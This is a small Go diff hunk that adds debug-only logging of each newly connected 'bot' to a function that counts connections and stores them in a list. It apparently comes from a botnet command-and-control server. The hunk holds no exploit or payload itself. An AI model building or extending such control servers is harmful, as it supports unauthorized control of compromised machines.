@@ -57,6 +57,9 @@ func (bot *Bot) newbot() {
 	BotCount++
 	go bot.Handle()
 
+	if !config.Release {
+		fmt.Println("[!] New bot connected: " + bot.conn.RemoteAddr().String())
+	}
 	BotsList.Store(bot.conn.RemoteAddr().String(), bot)
 }
 
